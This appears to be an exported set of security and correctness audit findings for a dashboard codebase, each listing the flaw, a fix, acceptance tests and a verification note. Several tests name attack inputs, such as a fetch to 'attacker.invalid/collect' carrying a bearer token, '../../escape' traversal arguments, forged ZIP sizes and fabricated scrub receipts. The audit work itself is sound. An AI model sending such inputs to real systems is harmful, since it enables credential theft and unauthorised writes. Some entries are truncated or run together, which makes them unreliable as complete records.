findings.title: Build context includes the credential-bearing .env file
findings.what: The local/staged-data and secret exclusions do not include `.env`. Both Dockerfiles later use `COPY . .`, so an operator's Compose credential file is sent to the container builder and retained in the build stage even though the final stage copies selected outputs.
findings.fix: Add `/.env` and appropriate private-key/certificate patterns to .dockerignore before any broad `COPY . .`.
findings.acceptance: With a sentinel root `.env`, a build-context listing or guarded test proves `.env` is excluded, and neither Dockerfile can read the sentinel after `COPY . .`.
findings.verifyNote: Second pass re-read .dockerignore:14-20 and confirmed the dispatched file excludes only public, *.local, and Tailscale-specific TLS names in this section; the root .env remains unmatched.

findings.title: Container base images are not digest-pinned
findings.what: The server image uses `node:24-slim` for both stages, while the SPA uses `node:24-slim` and `docker.io/nginxinc/nginx-unprivileged:1.27-alpine`. These mutable tags can resolve to different bytes across otherwise identical builds, weakening reproducibility and allowing upstream tag movement to alter the trusted runtime.
findings.fix: Pin every FROM reference to an approved immutable sha256 digest and update digests through a reviewed dependency-update process.
findings.acceptance: A policy check parses both Dockerfiles and verifies every non-scratch FROM has an `@sha256:<64-hex>` digest; two clean builds resolve identical base manifests.
findings.verifyNote: Second pass re-read all four FROM lines at the immutable baseline; none contains an OCI digest, and the SPA registry qualification does not make its tag immutable.

findings.title: SPA container ships without a liveness probe
findings.what: The standalone SPA image exposes port 8325 and relies on nginx's inherited command but defines no HEALTHCHECK. Orchestrators using image health metadata cannot distinguish a serving nginx instance from a wedged or misconfigured one.
findings.fix: Add a lightweight localhost health check against a static asset or dedicated endpoint, with explicit interval, timeout, start period, and retries.
findings.acceptance: Inspecting the built SPA image shows a non-empty healthcheck, and stopping or breaking nginx causes the container health state to transition to unhealthy within the configured budget.
findings.verifyNote: Second pass re-read Dockerfile.spa:60-69 through EOF; the shipped runtime has COPY and EXPOSE instructions but no HEALTHCHECK, unlike Dockerfile:97-105.

findings.title: Local .env secrets are not excluded from Git
findings.what: .env.example instructs operators to create a repository-root .env, but the ignore rules cover dependencies, build outputs, and *.local without excluding .env. Auth tokens, API keys, TLS settings, and passwords placed there can therefore be staged and committed accidentally.
findings.fix: Add a root-scoped `/.env` ignore rule, while retaining `.env.example` as the committed template.
findings.acceptance: After creating an untracked root `.env`, `git check-ignore -v .env` identifies the new rule, while `git check-ignore .env.example` reports no match.
findings.verifyNote: Second pass re-read .gitignore:10-18 and .env.example:1-2 at baseline c8b98a29508b5eb7725c75a7e2a41dfa94c1feba; no existing .env exclusion survives in the dispatched ignore file.

findings.title: Deployment images are selected by mutable tags

findings.title: Atomizer permits output-root path traversal through mapping and rules-dir
findings.what: The CLI accepts --section subtree values, JSON map values, and --rules-dir components without rejecting '..'. normalizeSubtree() preserves traversal segments and join(outRoot, move.rulePathRel) then resolves them outside outRoot before mkdirSync/writeFileSync. A supplied mapping subtree such as ../../target with --emit agents-md, or --rules-dir ../../target, therefore writes outside the declared clone/config output root.
findings.fix: Validate every generated rule path after resolve(outRoot, rulePathRel) and reject it unless it is strictly contained by outRoot; reject absolute paths and traversal components in rulesDirRel and mapping subtrees before planning.
findings.acceptance: Non-dry-run invocations using --rules-dir ../../escape or --section x=../../escape fail before creating any external file, while valid nested relative targets still write beneath outRoot.
findings.verifyNote: Second-pass reread confirmed traversal segments survive normalization at lines 293-295, CLI inputs are accepted at lines 781-794, and lines 562-572 write the joined path without the containment check used by revertFile at lines 641-648.

findings.title: Bundle attribution reports UTF-16 columns as built bytes
findings.what: attributeChunk() subtracts JavaScript string indices and calls the result bytes, although those indices are UTF-16 code units. Any emitted non-ASCII character makes group totals differ from the on-disk UTF-8 byte totals reported by statSync(), so bundle-size recommendations are not reproducible as byte claims.
findings.fix: Attribute each mapped span with Buffer.byteLength(line.slice(startColumn, endColumn), 'utf8'), including the actual newline only when present, rather than using column subtraction.
findings.acceptance: A fixture chunk containing a multibyte UTF-8 character attributes its exact Buffer.byteLength to the mapped source, and all attributed spans sum to the chunk byte length.
findings.verifyNote: Second-pass reread of baseline lines 69-97 confirmed readFileSync(..., 'utf8'), string-length arithmetic at lines 71, 88, and 96, while the report labels totals as built bytes.

findings.title: Multiline network constructors bypass the inbound boundary gate
findings.what: Non-fetch primitives are matched independently on each physical line. Valid code such as `new\nEventSource('/api/live')` does not place `new` and `EventSource` on the same line and therefore produces no violation, allowing a direct dashboard-server connection outside the sanctioned owner list. The regression fixture uses only a same-line EventSource expression.
findings.fix: Detect these primitives from the TypeScript AST, as already done for fetch, including NewExpression targets and navigator.sendBeacon property calls; add multiline regression fixtures.
findings.acceptance: Tests assert that multiline `new EventSource`, `new WebSocket`, and `new XMLHttpRequest` expressions outside owners are reported, while comment and string occurrences remain ignored.
findings.verifyNote: Adversarial re-read confirmed PRIMITIVE requires `new\s+<constructor>` in one regex input, but lines 175-189 apply it one line at a time. The only non-fetch primitive fixture at line 40 is same-line, so the valid multiline syntax survives both implementation and test coverage.

findings.title: Route inventory gate misses double-quoted handlers

A valid handler such as `pathname === "/api/new-sensitive-route"` or `pathname.startsWith("/api/private/")` produces no collected route, so the inventory validation can pass without an access classification. The tests cover only single-quoted examples.
findings.fix: Parse the server source with an AST and collect string literals independent of quote style, or minimally update both patterns to capture matching single or double quotes; add double-quoted exact and prefix regression cases.
findings.acceptance: A unit test passes double-quoted exact and prefix handlers to `collectEnterpriseRouteKeys`, asserts both are collected, and asserts an unlisted double-quoted handler makes inventory validation fail.
findings.verifyNote: Adversarial re-read confirmed lines 287 and 297 hard-code `'([^']+)'`, while the collector test at lines 28-45 contains only single-quoted handler syntax. JavaScript accepts the omitted double-quoted forms, and neither remaining collector branch matches them.

findings.title: Egress gate does not prove that Anthropic receives the scrubbed payload
findings.where: scripts/check-llm-egress.mjs:125; scripts/check-llm-egress.mjs:128; scripts/check-llm-egress.mjs:154; scripts/check-llm-egress.mjs:165; scripts/check-llm-egress.test.mjs:77; scripts/check-llm-egress.test.mjs:123

Consequently this release gate can pass while ~/.claude-derived content is sent under subscription OAuth credentials, contrary to the stated egress boundary.

Add a negative test where a scrub result is discarded and an unrelated payload is sent.

findings.verifyNote: Adversarial re-read confirmed that collection records only file, line, callee, and registryId (lines 92-123), while validation stores only registry IDs in independent sets (lines 125-169). The tests at lines 77-155 exercise discovery and presence but contain no payload-flow assertion; therefore the bypass is reproducible from the audited logic and is not merely a missing-style check.

findings.title: Route-table detector reports unrelated slash-keyed tuples as served endpoints
findings.what: The detector scans the entire server source for every array pair shaped like `['/path', identifier]`. It does not verify that the pair is inside a route Map or that the Map is subsequently queried with `pathname`. Consequently, an unrelated tuple such as `const metadata = [['/api/example', handler]]` is classified as a served endpoint, making the freshness result non-reproducible from actual dispatch behavior. The negative test covers only non-slash string pairs and identifier-keyed pairs, so it cannot expose this ambiguity.
findings.fix: Restrict extraction to entries inside a recognized route-map declaration whose identifier is demonstrably queried with `.get(pathname)`, preferably using a syntax-aware parser; add a regression fixture containing an unrelated `['/api/not-a-route', handler]` tuple.
findings.acceptance: A regression test proves that an unrelated slash-leading string/identifier tuple produces no served route, while an entry in a Map that is queried with `.get(pathname)` is still collected and drift detection continues to flag undocumented real table routes.
findings.verifyNote: Adversarial re-read of scripts/check-openapi-freshness.mjs:65-98 confirmed that the only route-table qualification is the tuple regex at line 95, with no surrounding Map or `.get(pathname)` check. Re-read of scripts/check-openapi-freshness.test.mjs:39-75 confirmed the positive fixture includes both contextual signals but the negative fixture never exercises the ambiguous slash-string/identifier shape.

findings.title: Non-anchored version parser permits release-gate bypass
findings.what: The version regular expression lacks an end anchor, so it accepts any string beginning with a valid-looking version. For example, `v0.2.1junk` is classified as patch 1; `main()` then exits successfully through the patch exemption before inspecting milestone gates. A malformed or unintended release target can therefore bypass the security and other standing release checks.
findings.fix: Require the entire normalized argument to match the supported version grammar by adding an end anchor: `/^(\d+)\.(\d+)(?:\.(\d+))?$/`.
findings.acceptance: Assert that `classifyTarget` rejects `v0.2.1junk`, `v0.2.1.0`, and `v0.2-beta`, while accepting documented forms such as `v0.2`, `0.2.0`, and `v0.2.1`; confirm invalid inputs exit non-zero before the patch exemption.
findings.verifyNote: Adversarial re-read confirmed line 55 performs a prefix-only match and lines 238-245 unconditionally exit 0 whenever the parsed patch is greater than zero. Thus `v0.2.1junk` deterministically reaches the exemption without any `gh` release-gate inspection.

findings.title: Non-executable workflow text can falsely prove a test suite is CI-wired
findings.what: collectWiredSuites applies suite-reference and npm-invocation regexes to the complete comment-stripped YAML document rather than only executable jobs.*.steps[*].run values. findings.title: Stale or replaced PID state can terminate an unrelated process group
findings.what: The persistent PID file contains only a numeric PID. cmdStop treats any currently existing process group with that reused number as managed and sends SIGTERM, followed by SIGKILL on POSIX, without checking process identity or a per-launch token. After an unclean exit and PID reuse—or modification of the user-writable state file—the stop command can kill an unrelated process group owned by the same user.
findings.fix: Persist an identity token alongside the PID and require an authenticated match before signaling, such as a random launch nonce exposed by the child through a protected readiness/state channel; at minimum verify immutable process start identity and expected executable arguments and refuse to stop on mismatch.
findings.acceptance: Create state referring to a live unrelated process/process group and assert that stop refuses to signal it and removes or quarantines the stale state; also verify that a genuinely launched dashboard with matching identity is still terminated.
findings.verifyNote: The second pass confirmed readPid validates only numeric value >1 at lines 82-88, while cmdStop's sole ownership check is process-group liveness at line 272 before unconditional SIGTERM at line 280 and possible SIGKILL at line 301. The dispatched tests cover numeric parsing and liveness but no process-identity binding.

findings.title: Concurrent worker output is buffered without a size limit

findings.fix: Parse NDJSON incrementally, retain only the final result and adherence counters, keep a bounded stderr tail, and terminate or mark unresolved when a documented per-worker output budget is exceeded.

findings.verifyNote: Adversarial re-read confirmed both streams accumulate without bounds at lines 225-228 and the full stdout is duplicated and reparsed at lines 240-260; concurrency allows several such buffers simultaneously.

findings.title: String timestamps silently defeat newest-first workflow ordering
findings.where: scripts/read-workflows.mjs:119 accepts startTime through boundedScalar; scripts/read-workflows.mjs:144 subtracts startTime values; scripts/read-workflows.mjs:157 applies that comparator.
findings.what: boundedScalar preserves arbitrary strings, but subtracting an ISO timestamp or other nonnumeric string yields NaN. findings.fix: Normalize startTime to a finite numeric epoch during projection, parsing supported timestamp strings explicitly or replacing invalid values with null; make the comparator operate only on normalized numbers.

findings.verifyNote: Adversarial re-read confirmed the same unvalidated boundedScalar result flows directly from trimWorkflowRun into numeric subtraction with no intervening timestamp normalization.

findings.title: Per-directory discovery caps permit multiplicative filesystem traversal

findings.what: The nominal 50,000-run bound is not a global work bound. findings.acceptance: Create a sparse nested fixture whose total entries exceed a small injected global discovery budget without producing runs; assert async and sync readers stop at that total budget, return truncated=true, and do not continue scanning later directories.
findings.verifyNote: Adversarial re-read of both implementations confirmed every readDirentsBounded call receives a fresh default counter and only runs.length can terminate the outer traversal; no aggregate discovery counter exists.

findings.title: Push-ingest metadata writes can follow a symlink outside the ingest root

findings.title: Per-request synchronous compression can block the server event loop on large live responses
findings.what: sendBody negotiates Brotli or gzip by calling brotliCompressSync/gzipSync on the request thread whenever no precompressed body is supplied. Raw history and merged-session routes pass potentially very large bodies through this path, so each requesting client can repeatedly monopolize the single Node.js event loop and delay all concurrent requests.
findings.fix: Make live-body compression asynchronous or stream it through zlib transforms; alternatively decline dynamic compression above a small fixed threshold and send the body uncompressed. Preserve the existing precompressed dataset path.
findings.acceptance: Request a near-limit history or merged-session response with Accept-Encoding: br and concurrently poll a lightweight endpoint; verify compression no longer causes event-loop latency spikes beyond the documented request budget, and verify Content-Encoding/body correctness for Brotli, gzip, and identity clients.
findings.verifyNote: Adversarial re-read confirmed that the cached dataset supplies precompressed buffers, but generic live/raw routes do not; sendBody therefore executes the synchronous Brotli or gzip branches once per encoded request with no body-size threshold.

findings.title: Non-atomic spool drain can lose concurrent receipts or duplicate already-appended receipts
findings.where: src/lib/adoption-spool.ts:74 reads the live spool, src/lib/adoption-spool.ts:94 appends the snapshot to the receipt log, and src/lib/adoption-spool.ts:102 later truncates the same live spool; src/lib/adoption-spool.test.ts:39 covers only a quiescent producer.
findings.what: A hook append occurring after the stream reaches EOF but before line 102 is erased by the truncation and never reaches the canonical log. Separately, if the destination append at lines 94-97 succeeds but truncation at line 102 fails, the catch leaves the original spool intact; retrying drains the same records again. Both outcomes corrupt adoption history and derived scorecard counts.
findings.fix: Serialize drainers and atomically rotate the live spool to a private snapshot before parsing. Immediately recreate the live append target so new hook writes are preserved, drain only the rotated snapshot, and retire that snapshot after successful append using an idempotent recovery protocol that cannot replay a snapshot whose destination append already committed.
findings.acceptance: Add deterministic tests with barriers around EOF, destination append, and snapshot retirement: a receipt appended during a drain remains queued and appears exactly once after the next drain; an injected failure after destination append followed by retry also leaves every receipt exactly once in the canonical log.
findings.verifyNote: Adversarial second pass re-read src/lib/adoption-spool.ts:74-106 and src/lib/adoption-spool.test.ts:39-90 at the immutable baseline. There is no lock, rename/snapshot step, append commit marker, or concurrency/failure test that closes either interval; the catch explicitly preserves the spool even when truncation fails after a successful destination append.

findings.title: Shared server fetch can leak the enterprise bearer token cross-origin
findings.what: `serverFetch` is exported with unrestricted `RequestInfo | URL`, defaults to the session-stored enterprise token, and adds `Authorization: Bearer ...` before calling `fetch` without verifying that the target is same-origin. The `credentials: 'same-origin'` option controls ambient credentials but does not suppress an explicitly supplied Authorization header, so any consumer that passes an absolute attacker-controlled URL sends the bearer token to that origin.
findings.fix: Resolve the input against `location.origin` and reject unless the resulting URL is same-origin (and preferably an allowed dashboard path) before adding Authorization; alternatively make the authenticated primitive accept only relative dashboard paths and provide a separate unauthenticated fetch for external URLs.
findings.acceptance: Add a test calling `serverFetch('https://attacker.invalid/collect')` while a token is present and assert it rejects before invoking fetch; retain a positive test showing a relative `/api/...` request receives the Authorization header.
findings.verifyNote: Adversarial re-read of src/lib/api-client.ts:425-435 confirmed there is no origin or path check between accepting arbitrary RequestInfo/URL and attaching the default bearer token; no inspected batch test constrains cross-origin input.

findings.title: Fabricated scrub receipts can authorize unsanitized Anthropic egress
findings.what: Rule-B transmission trusts caller-supplied `scrubReceipt` and `capReceipt` objects. `validScrubReceipt` at src/lib/anthropic-egress.ts:353 checks only caller-controlled metadata and never proves that `req.body` is the `content` returned by `egressScrub` at src/lib/anthropic-egress.ts:291. A caller can therefore pass an unredacted body containing transcript or secret material, fabricate a receipt with the expected registry ID/mode and nonnegative byte counts, and reach the fetch at src/lib/anthropic-egress.ts:193.
findings.fix: Remove public receipt-based authorization. Expose a send operation that accepts raw content and performs redaction, logging, cap enforcement, and serialization internally, or use an opaque unforgeable scrub result whose exact redacted content is the only body the egress function can transmit.
findings.acceptance: Add a test that submits secret-bearing raw content with a structurally valid fabricated receipt and asserts the fetch implementation is never called; add a positive test proving that only the exact redacted output produced by the trusted scrub path can be sent.
findings.verifyNote: Adversarial re-read confirmed `callAnthropic` serializes `req.body` unchanged at lines 189-193, while receipt validation at lines 353-366 compares no digest, identity, or content and all accepted receipt fields are publicly constructible.

findings.title: Unbounded categorical cardinality makes the regression cubic
findings.what: Every level with only three rows can add a design column, so k grows linearly with session count. Building X'X costs O(n*k^2), storing and augmenting the matrix costs O(k^2), and Gauss-Jordan inversion costs O(k^3). No maximum row/level/term budget or runtime probe bounds this server endpoint.
findings.fix: Cap modeled levels/terms using deterministic support ranking, reject oversized designs before allocation, and record fit duration, row count, and term count against an explicit endpoint budget. A numerically stable solver that avoids materializing an inverse would further reduce risk.
findings.acceptance: A high-cardinality input at the documented maximum is either rejected as insufficient before allocating the k-by-2k augmented matrix or completes within the declared latency and memory budget; telemetry exposes rows, terms, duration, and rejection reason.
findings.verifyNote: The second pass re-derived the loops: X'X iterates k² pairs over n rows and elimination iterates k pivots over k rows and 2k columns. Because minPerCell=3 is the only cardinality constraint, k remains O(n).

findings.title: Omitted thin factor remains in the sample and can confound advertised adjusted effects
findings.what: `chooseLevels` returns null when a factor has fewer than two qualifying levels. The corresponding `modelOk` or `toolOk` then returns true for every row, but no column for that factor is added. If the other factor varies, the fit proceeds and reports its coefficients as adjusted model/tool effects even though variation in the omitted factor remains in the sample. Correlation between the omitted factor and a retained factor can therefore create a false edge.
findings.fix: Distinguish a constant factor from a factor containing unmodeled thin levels. When a factor cannot be contrasted, retain only its single qualifying reference level (or reject the fit); never keep heterogeneous levels while omitting the factor.
findings.acceptance: Construct rows where model has one qualifying level plus a thin second level perfectly correlated with a tool level. The audit must either exclude the thin-model rows or return insufficient, and must not report the confounded tool level as an adjusted edge.
findings.verifyNote: Adversarial re-read confirmed that null factor metadata makes the filter unconditional (`!modelLevels`/`!toolLevels`) and that the resulting output is explicitly described as adjusted after controlling for difficulty; no later omitted-factor check exists.

findings.title: Mixed assignment regimes can be mislabeled as causal
findings.what: AxisAccum stores one assignment value, initialized from the first usable enrollment. Later sessions on the same axis contribute metrics without checking or combining their assignment regime. At src/lib/experiments/evaluator.ts:204, a first blind enrollment therefore makes an axis containing later self-selected menu sessions report confidence='causal' and omit the self-selection caveat. Map insertion order can consequently change the claim without changing the observations.
findings.fix: Track assignment regimes for every contributing session. Report causal confidence only when all contributing sessions are blind; otherwise report observational confidence and retain the menu-assignment caveat (or reject/split mixed regimes).
findings.acceptance: Add a unit case with at least one blind and one menu enrollment for the same axis, placing blind first and menu first in separate runs; both results must remain observational with the self-selection caveat, or mixed regimes must be deterministically rejected/split.
findings.verifyNote: Adversarial second pass re-read the accumulator initialization and confidence projection at baseline lines 177-207 and the ledger's accepted assignment values. No later consistency check exists; later mixed-regime metrics are appended while the first assignment remains authoritative.

findings.title: Hybrid search rebuilds and sorts the entire corpus on every query
findings.what: For every query, every eligible entry concatenates all pasted content, tokenizes it, allocates a new vector, calculates similarity, creates a result object and snippet, and then sorts the complete match set before taking at most 100 results. Cost scales with total transcript bytes on each invocation and can stall an interactive search surface or create large transient allocations.
findings.fix: Precompute/cache normalized entry text and semantic vectors when the dataset changes, cap indexed text per entry, and retain only the top K matches without sorting the full result set.
findings.acceptance: Add a representative large-corpus performance probe with a documented latency and memory budget; repeated queries over an unchanged corpus must not rebuild entry vectors, and pasted-content size must be explicitly bounded.
findings.verifyNote: Adversarial re-read confirmed there is no precomputed index or early limit: entryText includes every pasted-content value, embedSearchText runs inside the per-entry map, and slice(limit) occurs only after full filtering and sorting.

findings.title: Review synchronization serializes up to hundreds of individually timed requests
findings.where: src/lib/github-review-sync.ts:486 and src/lib/github-review-sync.ts:501; repository iteration is also serial at src/lib/github-review-sync.ts:523-533.
findings.what: Each pull request timeline fetch is awaited before the next begins. With the defaults, 100 timeline requests can each consume the 5-second timeout, producing roughly 500 seconds of ingest latency; configuration permits up to 10,000 requests. The request-count bound prevents infinity but supplies no total latency budget.
findings.fix: Fetch timelines with a small bounded concurrency pool and impose a total synchronization deadline; preserve the existing record and request ceilings.
findings.acceptance: Using a fake fetch that delays every timeline response, verify multiple timeline requests overlap only up to the configured concurrency and the entire sync aborts or returns fallback data within a fixed total deadline substantially below requestCount × fetchTimeoutMs.
findings.verifyNote: Adversarial re-read confirmed the inner loop awaits fetchJsonArray at line 501 and the outer repository loop awaits each repository at lines 527-533. Existing tests cap call count but provide no total-duration guard.

findings.verifyNote: The second pass re-read both the telemetry provenance and emitted strings. Lines 31-36 define subset-only evidence, while lines 62-71 extrapolate it universally; the test at lines 16-23 deliberately locks in that extrapolation.

findings.title: Scripted evaluation results can be mislabeled as live-model receipts
findings.where: src/lib/local-analyze-eval.ts:133-145 exposes endpoint and endpointKind as independent caller-controlled options; src/lib/local-analyze-eval.ts:227-238 stamps endpointKind without verifying the transport; src/lib/local-analyze-eval.test.ts:137-155 passes scriptedAnalyzeEndpoint with endpointKind='live' and expects live provenance.
findings.what: The structured provenance field intended to distinguish synthetic fixtures from real local-model evidence is not tied to the transport that produced the measurement. A caller can run the scripted fixture endpoint, label the record live, and publish synthetic pass rates as real calibration evidence.
findings.fix: Make provenance intrinsic to the endpoint abstraction, such as separate scripted/live runner functions or a branded endpoint object whose immutable kind is used by runAnalyzeEval; remove the independent endpointKind override.
findings.acceptance: No public API can pair scriptedAnalyzeEndpoint with live provenance, and a regression test proves scripted executions always emit endpointKind='scripted' while only a constructed live transport can emit 'live'.
findings.verifyNote: The second pass re-read both implementation and test. The mismatch is directly reproducible from the audited API, and the test explicitly validates the false scripted-as-live pairing rather than preventing it.

findings.title: Live polling synchronously materializes and reparses up to 64 MiB
findings.where: src/lib/live-session.ts:36 defaults the cap to 67,108,864 bytes; src/lib/live-session.ts:98-121 synchronously copies chunks and concatenates them; src/lib/live-session.ts:319-340 then scans and parses the complete merged string multiple times.
findings.what: Each live-session invocation can block the server while reading up to 64 MiB, retain chunk buffers plus concatenated Buffer/string copies, scan it for newest timestamps, and parse it again for token and tool views. The cap prevents unbounded growth but still permits substantial per-poll latency and transient memory, and this surface has no latency/memory probe or budget.
findings.fix: Use a bounded tail/incremental transcript reader and share one parsed event pass across liveness, token, and tool derivation; add an explicit live-poll latency and peak-memory budget at the maximum supported transcript size.
findings.acceptance: A benchmark/probe using a 64 MiB transcript demonstrates the live-session request stays within the documented latency and memory budgets, and instrumentation or tests show transcript bytes are not synchronously materialized and fully parsed multiple times per poll.
findings.verifyNote: Adversarial re-read confirmed the default 64 MiB cap, synchronous read/copy/concatenation, and three distinct full-content consumers on the same invocation. The cap and single-candidate selection mitigate scope but do not remove the per-request stall and allocation hotspot.

findings.title: Loopback model endpoint can redirect prompt data to an external host
findings.what: Only the initial endpoint is passed through chatCompletionsUrl/assertLoopbackEndpoint. The subsequent fetch does not set redirect:'manual'; standard fetch follows redirects. A loopback service can return a 307/308 redirect to a non-loopback URL, preserving the POST body containing model messages and defeating the stated local-only LLM-egress guardrail.
findings.fix: Set redirect:'manual' (or 'error') on the request and reject redirect responses. If redirects are required, follow them explicitly only after revalidating every Location target as loopback.
findings.acceptance: A test fetch implementation or local fixture returning a 307/308 Location to https://example.invalid must result in LocalModelError and must make no request to the redirected host; a normal loopback 200 response must still succeed.
findings.verifyNote: Adversarial re-read confirmed the only host validation occurs before fetch at line 159, while the fetch options at lines 174-185 contain no redirect policy or post-redirect URL validation.

findings.title: Routing recommendations are accepted and promoted without reproducible provenance
findings.what: The sanitizer accepts a recommendation's modelId, scope, weightedScore, evidence-strength label, and rationale independently of sanitized runs. Ingest then keeps and emits the highest such score without verifying matching model/scope evidence, veto state, or carrying the source artifact's createdAt/batchPath. An untrusted artifact can therefore inject an unsupported recommendation, and historical claims are emitted without an 'as of' timestamp or structured artifact provenance.
findings.fix: Define structured recommendation provenance containing the supporting artifact and run/evidence identifiers; derive or verify recommendation score and strongestEvidence from matching sanitized runs, reject recommendations contradicted by vetoes or lacking support, and retain createdAt/batchPath (or an explicit asOf field) in the summary recommendation.
findings.acceptance: A forged recommendation with no matching run/evidence, a score inconsistent with its supporting run, or a vetoed supporting run must be rejected. A valid recommendation must round-trip with run/evidence references plus batchPath and asOf/createdAt, and the summary must expose those fields.
findings.verifyNote: Adversarial re-read confirmed sanitizeRecommendation performs only scalar/type/enum checks, while ingest compares the supplied weightedScore and evidence rank directly. Neither stage cross-references artifact.runs, and the emitted recommendation omits the artifact ledger's createdAt and batchPath.

findings.title: Corpus validation can approve tasks that do not round-trip unchanged

Inputs normalized without being dropped—such as a non-integer expectExitCode defaulted to 0, trimmed text, duplicate/oversized tags, or an omitted tags field—retain the same count and are incorrectly reported valid. A caller can consequently execute or record different gate semantics from the parser's canonical form.
findings.fix: Compare the complete reparsed corpus with the supplied corpus using a deterministic deep equality check and report field-level normalization/drift, while retaining the existing malformed/duplicate count error.
findings.acceptance: Add tests where a one-task corpus has expectExitCode:1.5, padded text, duplicate tags, and missing tags; validateCorpus must return ok:false for each, while CURATED_CORPUS remains ok:true.
findings.verifyNote: Second pass confirmed parseObjectiveGate normalizes invalid expectExitCode to 0 and parseTags normalizes tags, while validateCorpus at lines 183-187 observes only reparsed.length; the existing success test does not exercise normalization drift.

findings.title: Realized model-pin savings confound model choice with workload volume
findings.what: The implementation reports `baseline.premiumUsd - comparison.premiumUsd` as realized savings even when the periods contain different entry counts, durations, token volumes, or workloads. findings.title: Model-pin split inference is quadratic in billable history size
findings.what: For each possible split, the loop allocates two slices, filters the entire suffix, and reduces both prefix and suffix. findings.fix: Precompute prefix and suffix counts and premium sums once, then evaluate each boundary in O(1), retaining only the winning index. Slice only once after selection.
findings.acceptance: A benchmark or probe over increasing histories demonstrates near O(n log n) total behavior including sorting, with 2x entries taking materially less than 4x split-evaluation time and without per-candidate array allocations.
findings.verifyNote: Adversarial re-read of src/lib/model-pin-savings.ts:107-131 and 210-249 confirmed one initial sort followed by a candidate loop whose `slice`, suffix `filter`, and two `reduce` operations rescan history for every eligible boundary; no prefix/suffix cache exists.

findings.title: Project route filtering performs quadratic session lookups
findings.what: sessionProject() uses Array.find across all sessions. Both project-filtered tool rows and project-filtered API-error rows invoke it once per row, so interactive filtering scales as O(rows × sessions). The linear Array.find is still present at src/lib/route-filtering.ts:32 and is called inside both row iterations at lines 47 and 101; neither function builds or receives an index, so the O(rows × sessions) behavior is reproducible whenever a project filter is active.

findings.title: Forged ZIP size metadata bypasses inflated-byte memory limits
findings.what: The handler reserves and validates bytes from file.originalSize when that field exists, but observed decompressed bytes are checked and added only when originalSize is undefined. ZIP size fields are untrusted metadata, so an entry declaring a small originalSize can emit substantially more data while text continues accumulating, bypassing both maxEntryBytes and maxTotalBytes and potentially exhausting the browser tab's memory.
findings.fix: Always enforce maxEntryBytes against observedBytes and account aggregate limits from emitted chunk bytes. Treat originalSize only as an early rejection hint; do not use it as the sole accounting source or add both declared and observed sizes.
findings.acceptance: Add a test using an archive entry whose declared uncompressed size is patched below its actual emitted size; unzipBundle must reject with UploadTooLargeError once observed bytes exceed maxEntryBytes or maxTotalBytes, and a normal archive with accurate metadata must still load without double-counting.
findings.verifyNote: Adversarial second pass re-read the cited baseline branches: lines 388-420 trust originalSize for admission/accounting, while lines 453-475 place both observed per-entry enforcement and chunk-based aggregate accounting inside `originalSize === undefined`. The existing tests only generate internally consistent ZIP metadata, so they do not invalidate the bypass.

findings.title: Upload batching does not bound peak decoded-text memory
findings.what: Every loose-file body is decoded and appended to the long-lived loaded array; every inflated archive entry is then appended as well. The complete decoded corpus remains reachable while session aggregation and all parser passes run. The file itself documents a representative 634 MB admitted-text upload at lines 7-8, so the claimed batching at line 142 only limits concurrent reads, not peak memory, and can cause worker termination or main-thread fallback memory pressure.

findings.verifyNote: Adversarial re-read confirmed loaded is initialized once at line 125, all batch results and archive entries are appended at lines 168 and 185, and the retained collection is still consumed at line 220 and later; no deletion, clearing, streaming, or decoded-byte cap exists in this file.

findings.title: MCP OAuth credentials can be sent to Anthropic as subscription credentials
findings.what: If ~/.claude/.credentials.json contains access tokens but none has the sk-ant-oat prefix or a Claude-named parent, findAccessToken returns the first arbitrary token. The test explicitly requires an MCP-only credential to be returned. The directly related server caller uses that return value as the OAuth credential for an Anthropic /messages request, so an MCP secret can leave ~/.claude in violation of the subscription-credential egress rule.
findings.fix: Fail closed unless the candidate is positively identified as the Claude subscription OAuth credential, preferably by the sk-ant-oat prefix or a narrowly validated Claude credential schema; remove the arbitrary first-token fallback and change the MCP-only test to expect null.
findings.acceptance: Given credentials containing only mcpOAuth accessToken values, findAccessToken returns null and no Anthropic call is made; valid sk-ant-oat and explicitly supported Claude subscription credential shapes still resolve, including when MCP tokens appear first.
findings.verifyNote: The second pass re-read lines 45-52 and the MCP-only assertion at test lines 46-48, then inspected only the direct baseline caller, which reads ~/.claude/.credentials.json and passes the selected token to the Anthropic /messages egress chokepoint. The candidate is therefore reproducible and not merely a naming concern.

findings.title: Sparse activity is misreported as a consecutive week-over-week comparison
findings.what: Lines 169-177 sort only weeks having activity and select elements 1 and 2. If activity exists in nonconsecutive weeks, the returned currentWeekStart and previousWeekStart can be separated by multiple weeks even though the API and comments identify them as the last complete week and the immediately prior week. The resulting percentage is therefore not a true week-over-week delta.
findings.fix: Derive the compared Mondays by subtracting 7 and 14 days from the excluded trailing week, and read absent buckets as zero; alternatively reject the comparison unless the selected week starts are exactly seven days apart.
findings.acceptance: Add a test with activity in ISO weeks beginning 2026-01-05, 2026-01-19, and 2026-02-02. The function must not compare 2026-01-19 against 2026-01-05 as week-over-week; it must either compare the consecutive calendar weeks immediately preceding 2026-02-02 with missing buckets valued at zero or return null under an explicitly documented consecutive-week policy.
findings.verifyNote: Adversarial re-read of src/lib/weekly-delta.ts:110-177 confirmed that activeWeeks records only buckets receiving data and that no seven-day adjacency check or missing-week insertion occurs. The related test at src/lib/weekly-delta.test.ts:148 covers only the number of active weeks, not gaps between them.

findings.title: MCP schema savings can overcount heterogeneous per-session tool inventories
findings.what: The detector obtains each server's toolCount from aggregate cross-session statistics, then charges that full union count to every session merely containing the server (lines 111-127). The user-facing claim at line 152 also says the schemas are cache-read every turn, while lines 124-127 explicitly model one cache-write followed by reads on only turns 2..N.

The related baseline parser defines McpServerToolStats.toolCount as a distinct cross-session server footprint, confirming that line 117 reuses a union count per session; the existing tests use identical 30-tool inventories in both sessions and therefore do not expose the overcount.

findings.title: Command identity is mistaken for duplicate output identity
findings.what: callFingerprint groups by tool name and command/preview only. Repeated executions of the same command can return different content and different sizes, yet the group is labeled a duplicate result and reclaim is calculated as (count-1) times the maximum result size. findings.fix: Require a stable result-content digest before classifying outputs as duplicates, or rename/recalculate this bucket as repeated-command output using the measured size of each repeat and explicitly qualify it as an estimate.
findings.acceptance: Add a case with the same command returning different result digests/sizes; it must not be reported as duplicate output. Identical digests must still produce reclaim equal to the actual repeated payload sizes and valid provenance.
findings.verifyNote: Second pass confirmed the fingerprint contains no result identity and lines 191-204 use the maximum observed byte count for every repeat. The dispatched tests cover repeated commands with equal fixture sizes but no differing-result adversarial case.

findings.title: Paste deduplication retains full normalized copies of every pasted block

